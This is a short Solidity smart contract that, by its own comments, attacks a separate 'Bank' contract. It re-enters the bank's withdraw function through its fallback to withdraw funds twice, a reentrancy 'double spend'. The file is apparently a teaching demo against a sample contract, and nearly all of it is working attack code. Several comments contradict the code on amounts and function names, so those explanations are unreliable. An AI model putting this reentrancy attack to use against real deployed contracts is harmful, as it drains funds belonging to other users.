pragma solidity ^0.4.24;
contract HackingContract{
/*This is the malicious contract that implements a double spend attack to the
first contract: contract Bank. This attack can be carried out n times. 
For this example, we carried it out only 2 times.*/

   bool is_attack;
   address attackAddress;

   constructor(address _attackAddress, bool _is_attack) public{
       attackAddress= _attackAddress;
       is_attack=_is_attack;
   }/*This function, which is the constructor, sets the address of the contract to be attacked
   (contract Bank) and enables/disables the double spend attack */

    function getAttackAddress() constant public returns(address){
        return attackAddress;
    }
    
    function getIsAttack() constant public returns(bool){
        return is_attack;
    }
    
   function() public{

       if(is_attack==true)
       {
           is_attack=false;
           if(attackAddress.call(bytes4(keccak256("withdraw()")))) {
               revert();
           }
       }
   }/* This is the fallback function that calls the withdrawnBalance function 
   when attack flag, previuosly set in the constructor, is enabled. This function
   is triggered because in the withdrawBalance function of the contract Bank a
   send was executed. To avoid infinitive recursive fallbacks, it is necessary
   to set the variable is_attack to false. Otherwise, the gas would run out, the
   throw would execute and the attack would fail */

   function  depositMoney() public{

        if(attackAddress.call.value(2 ether).gas(3000000)(bytes4(keccak256("deposit()")))
        ==false) {
               revert();
           }

   }/*This function makes a deposit in the contract Bank (75 wei) calling the
   addToBalance function of the contract Bank*/

   function  withdrawBalance() public{

        if(attackAddress.call(bytes4(keccak256("withdraw()")))==false ) {
               revert();
           }
   }

}